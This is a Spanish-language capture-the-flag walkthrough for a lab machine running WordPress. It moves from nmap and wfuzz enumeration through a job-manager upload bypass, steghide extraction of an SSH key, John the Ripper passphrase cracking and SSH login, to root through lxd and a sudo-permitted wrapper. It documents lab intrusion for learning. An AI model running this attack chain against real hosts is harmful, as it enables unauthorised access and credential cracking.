## Summary

- IP -> 10.10.10.10
- Ports -> TCP (22,80), UDP (idk)
- OS ->  
- Services & Applications
    - 22 -> SSH Openssh 7.2p2
    - 80 -> HTTP Apache Httpd 2.4.18 -> WordPress 4.7.3, La version mas actual de WordPress es la 6.0


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon
Launchpad SSH Openssh 7.2p2 4ubuntu2.1 -> Para saber el Codename Xenial
Launchpad Apache 2.4.18 ->  Xenial

- Comando -> **whatweb http://< URL>**  Nos dara una breve descripcion del gestor de contenidos del puerto 80

❯ **nmap --script http-enum -p80 10.10.10.10 -oN WebScan** 
-   -p80 -> Indica el puerto que se quiere escanear
-   10.10.10.10 -> Dirección IP que se quiere escanear
-   -oN WebScan -> Exporta el output a un fichero en formato nmap con nombre “WebScan”
-  http-enum -> Aplica Fuzing a HTTP, utiliza un diccionario de 1000 rutas y ver si hay algunas rutas existen

Enocntramos un usuario en la pagina que se llama Takis, por lo que lo verificamos en el panel de autenticacion

Ruta tipica de WordPress
- **/wp-admin.php** Es la ruta del panel de autenticacion de WordPress
- **/wp-login.php** Es la ruta del panel de autenticacion de WordPress
En ese panel podemos enumerar usuarios validos

- Comando -> **curl -s -X GET "http://10.10.10.10/index.php/jobs/apply/8/" | html2text** Tramitamos la peticion y para verlo mas bonito e intepretado le ponermos el html2text
- Comando -> **curl -s -X GET "http://10.10.10.10/index.php/jobs/apply/8/" | html2text | grep "Job application"** Tramitamos la peticion y para verlo mas bonito e intepretado le ponermos el html2text, ademas de simplificar lo que queremos para solo ver el tiitulo

- Comando -> **curl -s -X GET "http://10.10.10.10/index.php/jobs/apply/8/" | html2text | grep "Job application" | awk '{print $2}' FS=":"** Tramitamos la peticion y para verlo mas bonito e intepretado le ponermos el html2text, ademas de simplificar lo que queremos para solo ver el tiitulo. El awk nos permite delimitar por los dos puntos y asi tomaremos el segundo argumento 

Ahora nos contriumos un ciclo for para poder ver todos los titulos posibles 
- Comando -> **for i in $(seq 1 100); do curl -s -X GET "http://10.10.10.10/index.php/jobs/apply/\$i/" | html2text | grep "Job application" | awk '{print $2}' FS=":"; done** 
Ira iterando de uno en uno hasta llegar al cien y nos mostrara todos los titulos que existan (En el $i debemos de quitarle el \\, solo se puso para que no se modificara el comando en este caso)

Ahora debemos de enumerar Plugins en el WordPress
- Comando -> **wfuzz -c --hc=404 -t 200 -w /user/share/Seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://10.10.10.10/FUZZ/** Hacemos fuzing a una pagina web especifica para poder encontrar subdominios con un diccionario especifico, y el diccionario se aplicara en la palabra FUZZ (c=colorizado, w=wordlist, hc=hidecode, hh=hide characters ch en caso que sea necesario, t=tareas simultaneas). Es importante poner el nombre de la url, ya que muchas veces con la pura IP no encuentra nada. 

Buscamos en Google (wordpress job manager exploit)
Miramos que podemos hacer Bypass por medio de la parte del CV, y justamente hay una seccion en la pagina en donde podemos subir un CV.

Ahora debemos de buscar un Exploit pero como es del 2017 buscaremos en la pagina de las Snapshots (Wayback machine)
https://archive.org
Ahi buscaremos la pagina Vagmour.es que cotiene el exploit que necesitaremos para poder hacer el Bypass. Lo buscaremos en Agosto del 2018

Econtramos escrito el exploit. Por lo que hacemos un archivo en nvim con la extension .py
Ahi adentro lo pegamos y modificamos los siguientes campos:
	#!/usr/bin/python3
	print ()
	range (2017,2022) agregaremos mas anos 
	website =input
	filename=input
	extensions = 'jpg', 'png', 'gif' ... Agregaremos mas extensiones 
	print()

Con ese script lo que hace es que ingresemos primero el sitio vulnerable y despues el documento a buscar. Lo que hace es Fuzzing
Direccion IP : 10.10.10.10
filename : HackerAccessGranted

Nos encuentra un archivo .jpg 

Nos guardamos la imagen y nos la traemos a nuestra ruta de trabajo
* Comando -> **exiftool HackerAccessGranted.jpg** Para ver los metadatos de la imagen
- Comando -> **strings HackerAccessGranted.jpg** Imprimir las cadenas de caracteres 
- Comando -> **strings HackerAccessGranted.jpg -n 10** Imprimir las cadenas de caracteres, listamos las cadenas que contengan mas de 10 caracteres

- Comando -> **steghide info HackerAccessGranted.jpg** Para informarme si en esa imagen hay informacion oculta, le damos 'y' y despues le damos enter, pensando que no hay passwd
- Comando -> **steghide extract -sf HackerAccessGranted.jpg** Para extraer la informacion de la imagen, enter porque no esta protegido por passwd y obtenemos la id_rsa, en este caso de esta maquina
- Comando -> **steghide embed -cf gato.jpg -ef passwd** Donde la imagen se llama gato y lo que le queremos ocultar es el /etc/passwd y podemos ponerle o no passwd 

Tenemos el id_rsa pero esta esta encriptada
- Comando -> **chmod 600 id_rsa** Es el privilegio que debe tener una id_rsa

Usaremos jhon the ripper para extraer un Hash
- Comando -> **jhon id_rsa > hash** Para poder estraer el hash y lo pasamos a un archivo llamado hash
- Comando -> **jhon -w:$(locate rockyou.txt) hash** Aplicaremos fuerza bruta al hash con el diccionario de rockyou.txt

## User
- Comando -> **ssh -i id_rsa takis@10.10.10.10** Nos conectamos por ssh teniendo un id_rsa con privilegio 600, y empleamos la passwd que encontramos con jhon

Buscamos la flag de user.txt

## Root

- **lsb_release -a** Para ver la version del Ubuntu 
- **whoami**
- **id** Y nos encontramos en el grupo **lxd** y existe una via potencial para poder escalar privilegios
- **searchsploit lxd** Buscaremos el sploit en .sh 
- **searchsploit -x /linux/local/46978.sh** Este sploit esta hecho por Savitar y seguimos los pasos

De la forma intensionada es de la siguiente manera:
- **sudo -l** Para ver los privilegios en el Sudoers (l=ele), encontraremos un script que le podemos meter 4 argumentos. 
- **/bin/fuckin whoami** Si ejecutamos eso, nos mostrara el resultado del comando whoami que es Takis

Por lo que si lo hacemo de esta manera pasa lo siguiente:
- **sudo fuckin whoami** En este caso nos muestra que es el usuario root
- **sudo fuckin bash** En este caso nos convertira en el usuario root y listo podremos buscar la flag de root